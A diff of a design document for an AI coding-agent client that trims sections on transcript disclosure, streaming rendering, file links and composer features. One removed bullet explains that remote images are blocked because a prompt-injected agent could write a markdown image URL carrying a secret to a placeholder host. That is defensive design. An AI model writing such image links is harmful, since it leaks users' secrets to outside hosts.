-[ToolCallGroupBubble.tsx](../src/renderer/components/ToolCallGroupBubble.tsx) owns all activity disclosure. Multiple calls show natural summaries such as "Edited a file, read files, ran commands". Once a group settles, a plural clause carries its count ("Ran 11 commands, read 3 files"): distinct targets when the clause has them, calls otherwise. A group stays countless while any of its calls runs *and* while it holds the beat — a still-growing tally read as the finality of a result, and the three providers whose calls settle instantly would otherwise tick "Ran 2…", "Ran 3…" in place. Tool discovery is never counted: the number there is searches, not tools loaded. A headline names at most four kinds of work and counts the rest ("Viewed 3 images, ran 5 commands, searched files, read 6 files, and 3 more"): past that the line stops summarising and the column truncates it mid-word anyway. The phone's `TranscriptToolActivity.label` mirrors the wording. Opening the headline reveals compact rows, and opening a row reveals its output or diff. The group keeps its first tool's identity as calls arrive and preserves the reader's expansion choice through growth and completion. Failed calls add an explicit "N failed" suffix and tint the headline, including groups with successful calls.
-
-**The live caption.** A collapsed group names the call holding the beat beside the headline ("Running npm test", "Ran grep -rn …"), at every level above Minimal. Minimal is the exception on purpose: naming the command running right now is reading the work that level exists to not read, so its headline stands alone. It takes the width the headline leaves and clips to an ellipsis, so a long command shortens itself instead of folding one activity onto two lines; its flex basis is 0, so the summary is never the part that loses characters. Below an 18ch floor there is no readable stub to show, and the caption drops back to its own line under the headline — a narrow split pane or the phone shell. It takes the headline's own face rather than `--font-code`, command or not: beside the summary it is that sentence continued, and a mono run there read as a second kind of line. The bash *row* the group expands to keeps its command in `--font-code`, where it is the row's target. The call is the running one for Claude and Cursor, whose calls are seen running for hundreds of milliseconds. OpenCode, Grok and Codex report start and finish together, so their call is never seen running; for them the caption follows the beat owner ([activityBeat.ts](../src/renderer/lib/activityBeat.ts)), which is the same window their line already waves for.
-
-- **Minimal:** activity summaries alone while working — no live caption, and the summary's chevron held back until hover or focus. The line reports that work is happening, not what is running, and the turn chip is the standing disclosure. Clicking the headline still opens it. Finished turns hide all tool activity, including failed attempts, and pre-tool narration behind `Worked for`, keeping the answer, changed files, and session-level errors visible. Narration there means a *remark* — one short paragraph of plain sentences, the "Reading the repo now." an agent writes in the same envelope as the call it precedes (`isProgressNarration`, [sessionTurnView.ts](../src/renderer/lib/sessionTurnView.ts), mirrored in [MobileTranscriptRows.swift](../ios/Argmax/Sources/Transcript/MobileTranscriptRows.swift)). Prose carrying a heading, list, table, quote, or code fence, or running past a few sentences or a blank line, is the answer and stays, wherever the turn's last tool call falls. Shape cannot settle every case — "No, that file does not exist." and "Reading the repo now." are the same object to any predicate — so one positional guard sits beside it: the prose before the last tool is kept when what follows that tool is only a *sign-off*, under 160 characters and less than half the writing it acknowledges (`isClosingRemark`). Both rules exist for the same turn shape, the agent that answers and then records the answer with one closing edit or memory write; without them it was left showing nothing but "Done." The guard is deliberately tight: a turn that narrates, works, and then answers has a tail nowhere near half, and folds as it always did. The chip counts what it hides ("Worked for 1m 26s · 11 steps"). Opening the chip restores narration, settled reasoning, and activity summaries — and once open the groups read as Compact's do, captions and all, because the reader asked to inspect the work. The chip is drawn whenever the level hid something, not only when the turn has tools (`hasHiddenWork`): a turn whose only content was reasoning otherwise rendered as an empty block with no handle, and one whose only tool was a question card hid its narration behind a chip that was never drawn. A failed attempt does not keep its group in the finished transcript, since agents commonly retry and succeed.
-- **Compact:** one short activity summary between commentary messages, with agent launches standing apart from it, and the live caption while a call runs. Command text, file names, individual calls, and output appear only after expansion.
-- **Steps:** tool groups on the latest turn open to one row per call, named by its target ("Read sessionTurnView.ts", "Ran npm test"); outputs stay behind each row. Older turns start folded to their headlines. Thoughts split runs as their own rows: a live one shows a three-line preview, a settled one its first line. Resolves to `toolCallsDisplay: "collapsed"` with groups expanded, which also makes single calls their own row. The subagent pane (AgentActivity.tsx) reads the same flags, and since a run is always its pane's latest turn, every group of the run opens.
-- **Detailed:** opens recent tool details and groups too, while full thoughts stay inline with persistent labels. Each output shows its first 10 lines with Show all (ToolCallDetail.tsx `MAX_OUTPUT_LINES`), so a turn of eleven open calls does not read five times the height of the same turn at Steps. Older turns start with collapsed activity groups.
-
-The turn chip controls disclosure across the turn. Per-group and per-row choices survive incoming output. Expanding a group does not automatically expand every output block. A running action caption stays visible for at least 600 ms unless replaced by a newer action, while status and results update immediately. Minimal keeps newly finished activity for a 600 ms settling period before hiding it. Interacting with that activity keeps it visible for inspection. Restored history never replays either delay.
-
-## Smooth Answer Reveal & Live Auto-Scroll
-
-- **Paced reveal:** [StreamingMarkdown.tsx](../src/renderer/components/StreamingMarkdown.tsx) writes large visible streaming blocks out on the animation frame. Each frame moves a reveal position toward the end of the arrived text at a speed that eases toward `backlog / 0.25 s`, so the reveal keeps about a quarter second of text in hand: words flow at the rate they arrive, a burst of deltas speeds the writing up smoothly instead of landing as a block, and a pause in delivery drains to a stop. No provider streams at typewriter speed — Claude sends token-sized deltas ~30 times a second, Codex and OpenCode land the whole answer as one `message.completed`, and Cursor fires word-sized deltas in a burst — so a larger backlog is capped to land within ~1.1 s. The position is snapped to the end of the word it falls in ([streamingText.ts](../src/renderer/lib/streamingText.ts) `revealBoundary`), and a word that has not fully arrived waits for the rest of it, so half-typed words never flash; React renders only when the reveal crosses into a new word. Measured 2026-09-23 replaying a real 6,300-character Claude turn delta by delta through `SessionTimelines` and `SessionConversation` (production React, headless Chrome): text reached the screen 124 ms after it arrived (p50; p95 437 ms), against 1,130 ms (p95 1,856 ms) with the old 64 ms tick and 1.3 s drain window, at 32 updates a second of 7 characters instead of 13 of 18, with no stall over 100 ms while text was waiting. A block built from one `message.completed` is as live as a delta group while its turn runs (`coalesceAssistantGroups` marks it `streaming`), so an atomic Codex answer sweeps in instead of popping, and Claude's completion replacing its deltas no longer ends the reveal. When the block does stop streaming, text still unrevealed finishes at the pace it was going instead of snapping to the end. Progress is cached in a module-level map keyed by `revealKey` (session/agent ID + group creation time + group ID) so a live block the reader already watched resumes instead of restarting. Reopening a session still remounts the pane (`useRestoreWithoutMotion`): every completed group in a running turn is `streaming`, so without that flag they would all type out from nothing at once. Restore paints already-arrived text in full; only growth after the window types. The backlog itself arrives in pages (`session:events-since`, 500 events or 100 raw rows each — a long chat is a dozen round trips), so `SessionConversation` keeps the list laid out but unpainted (`data-loading`, a working-nest status with no text) until `eventsBackfilled`; the scroll controller pins the bottom while it fills, and the reveal is one paint at the latest turn instead of the first prompt followed by a jump. The same snap applies while `document.hidden`, or after a frame gap over a second — a backgrounded window cannot show the frames, and pausing left every finished bubble to replay when the user came back.
-- **Completed answers retain their content boundaries.** Markdown blocks beginning with a heading, list marker, or code fence stay separate from preceding prose. Answer deduplication compares answers only, so matching reasoning or error text cannot hide a reply.
-- **The writing head fades in.** Newly revealed words are a *fresh run* ([streamFreshRuns.ts](../src/renderer/lib/streamFreshRuns.ts)): the reveal records where a run started and when, a rehype plugin cuts the rendered tree at those offsets, and each run fades from 30% opacity to its own ink over 420 ms. Words revealed within 60 ms share a run, so about seven runs are in flight at once rather than one per frame, so the writing head carries a soft left-to-right gradient instead of stamping a block of characters down at full ink, and the last runs finish after the stream has ended rather than snapping. Only the typewriter's own output fades: a live thought is unpaced, a tool row is not markdown, and code blocks are skipped because the highlighter owns their reveal. The fade is opacity and nothing else, so it composites; its phase is anchored to the wall clock rather than to the span, because re-parsing the markdown hands a run's text to whichever span now sits in that position. Under reduced motion there is no typewriter, so there is no fade either.
-
-- **Streaming Markdown re-parses only the block being written.** While a message is live it is split into top-level blocks ([markdownBlocks.ts](../src/renderer/lib/markdownBlocks.ts), `marked`'s lexer, loaded lazily with the first live block), and each block renders through its own memoized `react-markdown` root as siblings in one `.markdown` container. Text arriving later can change the block being written and, by joining it, the one before (a lone `5` becoming `5. item` continues the list above), so those two stay open and every earlier block is final and never re-parsed. A document with a reference-link or footnote definition stays one block, since a definition resolves across the whole document. Checked 2026-09-23 against 4,000 real answers: the split render's HTML matched the whole-document render for all but one, which differed only in a newline between block elements, and incremental splitting matched a from-scratch split in every case. The open block's last line has its unfinished inline syntax closed (`remend`: bold, italic, inline code, strikethrough, links as text), so `**bo` shows as bold rather than as asterisks; code, tables, and finished lines are left alone, which keeps the healed live render identical to the final one for all but 2 of 20,701 real blocks. A block that was ever live keeps rendering block by block after it completes, so finishing never swaps its DOM; history that was never live renders as one document. Fence parsing belongs to `react-markdown` and its CommonMark parser.
-- **Fenced code blocks:** [CodeBlock.tsx](../src/renderer/components/CodeBlock.tsx) keeps the existing Shiki highlighter and renders each fence as a rounded `--tool-block-surface` well. The in-flow header identifies tagged fences with a human-readable language label and code mark, and keeps Copy and Wrap lines available by keyboard as well as pointer. Wrapping changes presentation only: Copy always writes the original fence contents. Untagged and plaintext fences omit the language label but keep the same toolbar geometry, so controls never cover a short first line. The block body owns horizontal overflow, has no vertical cap, and suppresses mono ligatures through `--code-font-features`; theme changes invalidate cached token colors. A settled fence paints plain and colors a few milliseconds later from a sliced highlight queue (or at once from the highlight cache), so opening a chat full of code never tokenizes every fence inside one render. A fence highlights the moment the block after it starts. The fence still being written re-highlights at most every 150 ms (up to 400 lines): lines highlighted last time keep their colors and only the newest lines are plain until the next pass.
-- **LaTeX & Math Equations:** Mathematical expressions in assistant responses render via `remark-math` and `rehype-katex` with bundled KaTeX stylesheets. Delimiters are normalized via [normalizeMathDelimiters.ts](../src/renderer/lib/normalizeMathDelimiters.ts), supporting LaTeX display equations (`\[ ... \]`), inline math (`\( ... \)`), bare Greek letters (`\tau`), LaTeX environments (`\begin{align}`), and standard markdown `$$...$$` / `$...$`. A `$` only opens math when the span it closes reads like an equation: a digit-leading body may not close against whitespace or an opening bracket, no closer may run straight into another amount, and a multi-word body with nothing equation-shaped in it is prose. So per-unit prices (`$1.25/1M in and $4.25`, `~$5/$25`) and shell variables (`$PATH and $HOME`) stay plain text, while `$2x + 1$` and `$ x = \alpha $` still render. Every `$` left over after that pass is escaped, so a lone dollar sign prints instead of silently pairing with the next one. iOS runs the same rule natively in [TranscriptMarkdownPreparation.swift](../ios/Argmax/Sources/Transcript/TranscriptMarkdownPreparation.swift) (`isInlineMath`), which also holds `$` inside a code span — `` `export FOO=$BAR` `` — out of math; keep the two in step.
-- **Mermaid diagrams:** Fenced `mermaid` / `mmd` blocks render as SVG via the `mermaid` package, loaded on first use so the cold-start graph stays lean. [MermaidDiagram.tsx](../src/renderer/components/MermaidDiagram.tsx) draws them on the transcript (not in a filled well), themed from live CSS tokens (Light / Dark / accent) with mermaid's `neo` look. A small drawing hugs its SVG. Width is judged against the fixed 780px prose measure rather than the configurable chat column. A wide drawing breaks out symmetrically by at most 20% of that measure on each side, limited by the measured space before the pane edge and the transcript's right edge so it cannot slide under the workspace card, and fills that wider box. Expand in the toolbar opens the diagram at native size in a window overlay. Escape or the backdrop closes it. Incomplete fences while streaming show a pending status. A finished diagram's SVG is kept per theme and source (48 most recent, [mermaidRuntime.ts](../src/renderer/lib/mermaidRuntime.ts)), so reopening a chat paints its diagrams in the first frame: measured 2026-09-23 on three real answers, remounting went from 329–345 ms to all diagrams drawn, 0.227 cumulative layout shift, and ~285 ms of long tasks, to 37–45 ms with no shift and no long task. A finished fence that cannot be parsed falls back to the source and a short error. Copy and Source live in the same hover toolbar. The Files panel's rendered Markdown preview draws the same fences through the same component. Agents are told this is how a diagram reaches the user ([agent-tools.md](agent-tools.md), MCP `ServerInfo.instructions`).
-- **Auto-follow scroll:** [useConversationScroll.ts](../src/renderer/hooks/useConversationScroll.ts) follows output until the reader scrolls upward. The content minimum height reserves space for the latest prompt and protects a detached reader from content collapse. See Follow scroll above.
-- **Images in answers:** [MarkdownImage.tsx](../src/renderer/components/MarkdownImage.tsx) renders every absolute image path except the attachment store through `argmax-asset://`, and saved chat attachments through `argmax-attachment://`. The asset handler serves image files inside a project or workspace root or a temp directory (`/tmp`, `$TMPDIR`), where agents write the screenshots they take; the iPhone reaches the same handler over `/api/workspace-assets`. A local path that neither handler accepts becomes a file chip after the image request fails, never a broken image box. A remote `http(s)` image is drawn as a link to its host instead of being loaded: fetching one is a silent outbound request the reader never asked for, which is enough for a prompt-injected agent to write `![](https://host/x.png?<secret>)` and have the webview carry the secret out. `resolveChatImageSrc` refuses those and the phone's `TranscriptMarkdownImageSource.remoteURL` refuses them the same way. This is the channel an agent uses to put a picture on screen — a screenshot it took, a chart it generated — and it is the only one: an image a tool merely returned reaches the model, not the chat.
-- **Web links in answers:** HTTP schemes are recognized regardless of case. Protocol-relative URLs (`//example.com`) use HTTPS. Both follow the configured browser target through `WebLink`.
-- **Directory links in answers:** Local links that do not match a file chip, including worktree directories and extensionless paths that are not files, open through the system. Relative paths resolve within the active checkout. Their clicks never navigate the app's main webview, and failed opens show an error toast.
-- **File links in answers:** Absolute paths inside the active workspace are reduced to workspace-relative paths before opening. [openableFile.ts](../src/renderer/lib/openableFile.ts) also recognizes the same repo-relative suffix when an answer names a file from another checkout. An absolute or `~/` path that exists outside the workspace opens in the Files panel as a **read-only external tab**, keyed by the path itself (workspace-relative keys never start with `/` or `~/`). `reviewIpc` routes those keys to `workspace:read-external-file` / `workspace:stat-external-file` (read-only, absolute or `~/`, symlinks resolved, same size and binary caps; there is no write channel, and the remote dispatcher serves them too). The chip for such a file shows its whole path with home collapsed to `~`. A path that no longer exists still falls back to the repo-relative suffix match, then to the system opener.
-- **Which inline code and links become file chips** ([fileChipPath.ts](../src/renderer/lib/fileChipPath.ts)): a relative path or bare name needs path characters only and an extension, 1–5 characters for a bare name (so `config.enabled` stays code) and up to 10 once the value has a `/` (`data/model.sqlite`, `out/events.parquet`). An anchored path, one that starts with `/`, `~/`, or `../`, may contain spaces (`~/Library/Application Support/…`, or a link's `%20`) and may run to 1,024 characters. `../` resolves against the workspace. An anchored path without an extension (`/etc/hosts`) is shown as code until a stat confirms it is a file, because the same text is often an API route such as `/api/users`; [CheckedFileChip](../src/renderer/components/FileChip.tsx) does that check and caches only confirmed files.
-- **Tail reserve & resize:** `.conversation-list` maintains constant bottom padding (`--space-8`). A `ResizeObserver` monitors the viewport and composer prompt editor to adjust scroll offsets dynamically as drafts expand. A width-driven reflow (the side review/log panel opening or closing) keeps a reader who was already at the bottom at the bottom instead of leaving the new bottom out of view; height-only growth below a detached reader still leaves them alone.
-- **Workspace card:** [WorkspaceCard.tsx](../src/renderer/components/WorkspaceCard.tsx) floats worktree status and a glanceable subagent roster in the right gutter when pane width allows. The branch name may run to two lines, folding after a slash or hyphen (`adam/` then `feat-approvals-and-chat`) before it ellipsizes; the hide × sits beside the base ref so the name keeps the full width. Clicking the branch name copies its full value, including text hidden by ellipsis, and reports success or failure in the button tooltip. Each chip in that overlapping stack is the agent's emblem on a ring tinted from the same hue — one colour per agent, not a chip colour and a mark colour — and a multitask keeps its initial on its hashed tint. Width is a two-stage gate. While the centered gutter can hold the card nothing moves; below that the transcript gives the right gutter up and slides left, keeping the card rather than losing it, until its own left gutter is down to the minimum — a little over 200px of extra pane per chat width. Narrower than that the card goes and the transcript recenters. The composer and the scroll-to-latest button travel with the transcript, so the column keeps one left edge. Docking the review or log panel narrows the pane and the measure together, so the card survives to a narrower pane, not a wider one. The PR row is the number and nothing else: state is the icon, the same marks the sidebar uses — sage `GitPullRequest` open, purple `GitMerge` merged, muted `GitPullRequestClosed` closed, and the plain GitHub mark until the state has been polled. Spelling the state out cost more of a narrow row than it bought. The icon is `aria-hidden`, so the word still reaches a screen reader through the row's title (`Open pull request #1158 on GitHub (merged)`). Clicking the row creates a PR or opens the existing one with the same link-target preference as chat links.
+[ComposerUsageChip.tsx](../src/renderer/components/ComposerUsageChip.tsx) shows the tightest limit window. It shares the Usage page's cache, so any number of composers cost one fetch. It never calls a model. A failed read keeps the figures held ([ledgerPageState.ts](../src/renderer/lib/ledgerPageState.ts)).
 
 ## Command icons
 
-Shell rows carry a brand mark when the command they run identifies a service.
-One rule ships with every build: a command that starts with `gh` gets the GitHub
-mark, so creating a PR or watching a check run reads as GitHub at a glance.
-Plain `git` stays unmarked, because a remote is not necessarily GitHub.
+A command that starts with `gh` gets the GitHub mark. Plain `git` stays unmarked, because a remote is not necessarily GitHub.
 
 ### Personal command icons
 
-Create `argmax-icons.local.json` at the checkout root to give shell commands a
-brand mark in your own builds. The file is Git-ignored and optional. For example:
+Create `argmax-icons.local.json` at the checkout root to add brand marks in your own builds. The file is Git-ignored and optional.
 
 ```json
 [
@@ -768,36 +340,6 @@ brand mark in your own builds. The file is Git-ignored and optional. For example
 ]
 ```
 
-`commandPattern` is a JavaScript regular expression applied to the full command
-after shell launch wrappers such as `zsh -lc` are removed. Anchor it with `^` to
-avoid matching incidental mentions in arguments or SQL text. The first matching
-rule wins. `server` names an existing mark in
-[serverIcons.ts](../src/renderer/lib/serverIcons.ts). Invalid rules raise an
-explicit configuration error when the renderer loads. Your rules are tried
-before the built-in `gh` rule, and MCP server marks take precedence over both.
+`commandPattern` is a JavaScript regular expression, applied to the full command after shell launch wrappers are removed. Anchor it with `^`, so it does not match mentions in arguments. `server` names a mark in [serverIcons.ts](../src/renderer/lib/serverIcons.ts). Invalid rules raise a configuration error when the renderer loads. Your rules run before the `gh` rule, and MCP server marks take precedence over both.
 
-Run `npm run tauri:build` after changing the file. Your mappings are bundled into
-that build, including its mobile renderer. Builds made without the file keep the
-built-in `gh` rule and nothing else. Installing a public release replaces the customized build, so
-rebuild to restore the mappings. This is build customization, not a runtime
-Settings preference. Anyone receiving your custom binary also receives its
-mappings.
-
-## Follow-up Queuing & Drafts
-
-- **Mid-turn messages:** Submitting a prompt while an agent is running places the message into a pending queue. The queue sits on top of the composer as a tucked tab, slightly narrower and behind the input card. Each queued row can be edited, deleted, or promoted to a multitask. **Stop & send** ends the active turn and sends the row as a new turn. For a running Codex, Claude or OpenCode session, **Steer** delivers a compatible row into the active turn without stopping its tools. The queued provider, model and reasoning effort must match the session. A row bound for another provider shows a `Then <Provider>` tag, is never steered, keeps its Multitask action (the multitask runs with the row's own provider, model, effort and fast mode), and comes back with its provider, model and effort when taken back for editing; a row queued before providers could be chosen carries none and runs on the chat's own provider. Codex steering is withheld once the live context reaches 85% of its reported window: the row stays queued for the next turn instead of risking an automatic compaction between the steer acknowledgement and its continuation. It is also withheld while a compaction is actually running, whatever the context reads: `turn/steer` is acknowledged during the rewrite and then dropped — the text never reaches the thread — so the row stays queued rather than being shown as delivered and never answered. If delivery fails, the row remains queued and can show `Delivery uncertain • check the chat before sending again`. Once the session is idle, the interrupt action reads **Send**. **Enter** is what queues, so the running composer shows Stop as its only control, except on a touch surface (`pointer: coarse`, the phone companion), where a queue button appears beside Stop once the draft has text, an image, or an annotation. A thumb has no Enter key, and an empty draft still leaves Stop alone there. A focused queued row can be removed with Backspace or Delete.
-- **Suggested follow-up:** once a turn completes, [useFollowUpSuggestion.ts](../src/renderer/hooks/useFollowUpSuggestion.ts) asks `session:suggest-follow-up` for the reply the user would most plausibly send, and shows it as the composer placeholder instead of the static hint. **Tab** drops it into the draft (only while the draft is empty) so **Enter** sends it. One call per completed turn (keyed on `completedAt`), on the cheap title model. The minted suggestion is also kept in `ui_state` against a digest of the agent message it answers ([follow_up_suggestions.rs](../src-tauri/src/persistence/follow_up_suggestions.rs)), so reopening a chat after a restart reuses it instead of booting the helper CLI again (about 5 s and 1.7 CPU-seconds for Claude, measured 2026-09-23). Suggestions target 3–8 words. Answers over 12 words, failures, and empty answers keep the static placeholder.
-- **Drafts:** Unsent drafts and screenshots persist in `localStorage` under `argmax.composer.drafts` via [composerDrafts.ts](../src/renderer/lib/composerDrafts.ts), keyed by session ID or `launch-<projectId>`. Each entry is stamped `v: 2`; drafts without a stamp (and the bare-string form before screenshots) still read, and an entry stamped by a newer build is skipped instead of misread. A chat reference needs no field of its own, because it is a link inside the draft text. An entry from a newer build stays in storage untouched when this build writes another draft. A window capture the native layer delivers (`composer:attach-window-snapshot`) attaches to the one composer in use, like a pasted image, through the inbox in [windowSnapshotInbox.ts](../src/renderer/lib/windowSnapshotInbox.ts): the focused session composer or the New chat draft claims it, never a hidden pane, and its chip names the app and window. Changing projects in the launcher transfers text via `carryTextOnRetarget`. A send drops the stored entry immediately (the on-screen text stays until delivery finishes) so the next NEW CHAT cannot restore a prompt that already launched.
-- **Attachment-only prompts:** A screenshot can start a new chat or send a follow-up without typed text, using Send or Enter. Running sessions queue it the same way as text. The prompt carries the saved image reference and attachment metadata. An empty draft without attachments or annotations remains unsendable.
-- **Selection annotations:** Highlighted text in the transcript opens [SelectionToolbar.tsx](../src/renderer/components/SelectionToolbar.tsx). "Add to chat" inserts the excerpt as a blockquote annotation in the prompt. Open review tabs append context in the same format. An attached annotation is sendable on its own: with a chip in the lane, send is enabled and Enter works on an empty draft.
-- **Diff notes:** Click the review panel's gutter "+" for one line, or drag across lines within a hunk to open a form for the highlighted range. The note joins the annotation lane as `Diff note · path:line` or `Diff note · path:start-end`. [composerAnnotations.ts](../src/renderer/lib/composerAnnotations.ts) serializes it as an `<argmax-diff-note file= line= side= base=>` block, adding `end-line` and `end-side` for ranges. Quoted ranges retain diff markers, and ranges crossing between removed and added code label both endpoints. The header tells the agent to address the note in the local worktree. `side` identifies pre-change versus current code, and `base` names the review comparison.
-- **Side chat & popup:** "Ask in new chat" opens a scratch-workspace session with the selected excerpt. "More details" opens [DetailsPopup.tsx](../src/renderer/components/DetailsPopup.tsx) against an ephemeral popup-kind session.
-
-## Prompt Editor, Chat References, and Background Send
-
-- **One editor, two composers.** Both prompts are the same CodeMirror 6 editor ([ComposerEditorView.tsx](../src/renderer/components/ComposerEditorView.tsx), extensions in [composerEditor/extensions.ts](../src/renderer/components/composerEditor/extensions.ts)) set to the box a textarea had: plain text, wrapping, undo and redo, spellcheck, IME, a 52px floor and a 168px ceiling that scrolls. It exposes the textarea-shaped `ComposerField` handle (`focus`, caret, `setSelectionRange`, `contains`) the menus use. Enter and Shift+Enter only break the line (no auto-indent), the key handler never sees an IME-confirming Enter, and a file dropped on the field is left to the attachment hook. The `/skill` tint is a decoration on the text itself, so the old mirror layer is gone. Edits that come from outside the field (a slash-menu insert, a file or chat picked from the `@` menu, a restored draft) are diffed into the document so the caret stays put, and they are part of undo history like typing: leaving them out made undo replay earlier typing onto text it no longer matched. Two things start a history over: a different `documentKey` (the draft key, so ⌘Z in one chat never reaches into another's prompt) and the prompt becoming empty from outside (a send, so undo does not bring a sent message back). The field follows the app's value after every commit, not only when it changes, so typing and sending inside one batch cannot leave sent text in the editor. A submit reads the text through the field handle (`ComposerField.value`) because React's copy can be a render behind a keystroke. Copy and cut with nothing selected do nothing, where CodeMirror would take the whole line; a disabled field (a send in flight) is read-only, so it still copies but takes no cut, paste or drop. The placeholder is `aria-placeholder`, drawn by CSS (`.cm-content::before`, one ellipsized line) while the prompt is one empty line, not by CodeMirror's placeholder widget: that widget and its `cm-widgetBuffer` images left a stray second caret at the line start in WebKit. A chip is not reachable by Tab, so ⌘⇧O opens the chat reference the caret is in or touching, and a resolved chip also answers Enter and Space when it has focus. [ComposerEditor.tsx](../src/renderer/components/ComposerEditor.tsx) loads it as its own chunk once the app is idle (the entry's size budget, `scripts/check-bundle.mjs`, cannot carry CodeMirror) and shows a plain textarea with the same props until then ([ComposerFallbackField.tsx](../src/renderer/components/ComposerFallbackField.tsx)); the swap keeps the text, the caret and the focus. The phone's new-chat screen keeps its textarea.
-- **A chat reference is a link, and the link is the only copy.** `[title](argmax://chat/<session id>?v=1&e=<event id>)` ([composerContext.ts](../src/renderer/lib/composerContext.ts)). Drafts, queued messages, sent prompts, recalled prompts, the clipboard and providers all hold that string, so there is no side record to lose when a draft is restored or a queued row is taken back for editing. The editor draws it as a chip the caret treats as one character (atomic range: Backspace removes the chip, arrows step over it). The id is the authority; the title is the chat's name when it was attached. A chip shows the chat's current title; a chat the app no longer has stays visible as a dashed `title (unavailable)` chip that opens nothing. A link with another version is not matched and stays as visible text. The backend reads the same link as the person's grant to read that one chat ([agent-tools.md](agent-tools.md#who-may-read-whom)).
-- **Attaching.** Typing `@` plus two letters lists chats whose title holds every word, then chats matched by what was said in them (the existing `session:search`, after a 200 ms pause, stale replies dropped), under a `Chats` heading in the same menu as files. The chat itself is never offered. Enter inserts the link and its chip. The queue lane shows a reference by its title, on the phone too ([ChatReferenceText.swift](../ios/Argmax/Sources/Transcript/ChatReferenceText.swift) and `chatReferencesAsTitles` in the web shell); Edit hands the link itself back. Clicking a chip, in the composer or in a sent prompt or an answer that cites the chat, opens it ([ChatSourceChip.tsx](../src/renderer/components/ChatSourceChip.tsx)). The chat list comes from [chatDirectory.ts](../src/renderer/state/chatDirectory.ts), which App publishes, so no pane threads it down.
-- **Copy and paste.** Copy and cut put the selection on the clipboard as plain text (each chip as its markdown link, so a plain-text target keeps the title and id) and as `application/x-argmax-composer+json` (`{v, text, references}`). Paste takes the typed entry only when it decodes and its references match its text; otherwise it pastes the plain text. A reference pasted into a window that does not know the chat shows as unavailable, not as nothing.
-- **Background send.** In the New chat launcher the remappable chord (default ⌥↵; Settings → General → Start in background; stored as a Tauri accelerator in `argmax.shortcuts.backgroundSend`, see [shortcutChord.ts](../src/renderer/lib/shortcutChord.ts)) starts the chat without leaving the draft: the prompt, attachments and stored draft empty at once, the chat appears in the sidebar without the app moving to it, focus stays in the prompt, and a toast offers `Open`. It skips Project check on purpose, since that may open a dialog, and refuses Cloud, which opens a review first. If the start fails the draft returns above whatever has been typed since ([draftRestore.ts](../src/renderer/lib/draftRestore.ts)). When the launcher has been left by then, or aimed at another project, the draft is written back to storage under the key it was sent from, so the next New chat for that project has it; the toast says which. A launcher on screen for that draft takes it through `subscribeDraftRestore` ([composerDrafts.ts](../src/renderer/lib/composerDrafts.ts)), including one opened after the send began, and merges it above what was typed. The chord must be one the app does not already use (the recorder rejects menu accelerators, the renderer's own chords and the editing chords; [reservedChords.ts](../src/renderer/lib/reservedChords.ts)). A test reads the accelerators out of [menu.rs](../src-tauri/src/menu.rs), so a new menu item cannot be missed. A chord whose key the app answers with ⌘ is refused with any extra modifier too (⌘⇧K when ⌘K is taken), because the global handlers match modifier variants. The positional keys ⌘` and ⌘§ record as `Backquote` / `IntlBackslash`, and both are reserved (with ⇧ and any other modifier) from `CHAT_CYCLE_CODES` in [menuKeybindings.ts](../src/shared/menuKeybindings.ts), the list the chat-cycle handler also reads, and the keyboard cheat sheet lists it as currently set. An IME-confirming Enter never fires it.
-- **Plan usage.** A gauge chip beside the model chip ([ComposerUsageChip.tsx](../src/renderer/components/ComposerUsageChip.tsx)) shows the tightest limit window of the provider's plan; its popover lists every window with its reset. It reads the Usage page's own `usage:remaining` cache and joins any read in flight, so any number of composers cost one fetch; the cache is fresh for five minutes, and pressing the chip may refresh sooner but not within 30 seconds of the last read. It never calls a model and never resumes a chat that hit a limit. A provider whose login reports no plan windows shows no chip. A failed read keeps the figures already held and the time of the failure, and a chip that mounts within the stale window after one does not ask the accounts again; only pressing it may, after 30 seconds. One account failing arrives as an `error` row inside a read that worked; the Usage page shows it, and the chip keeps that provider's last good figures ([ledgerPageState.ts](../src/renderer/lib/ledgerPageState.ts)) and labels them "as of <time>" once they are over five minutes old. Every caller of the shared cache (Identity plans, the Usage panel, the prefetch) records a whole-read failure through `recordUsageRemainingFailure`, so none empties the held figures. The caret is reported again when the editor swaps documents, so a slash or `@` menu never reads a stale position. A window capture goes to a floating composer (the "More details" popup or the Multitask dock) while one is in use, not to the chat beside it ([useWindowSnapshotAttach.ts](../src/renderer/hooks/useWindowSnapshotAttach.ts)).
+Run `npm run tauri:build` after changing the file. The mappings are bundled into that build. Anyone who receives the binary also receives them.
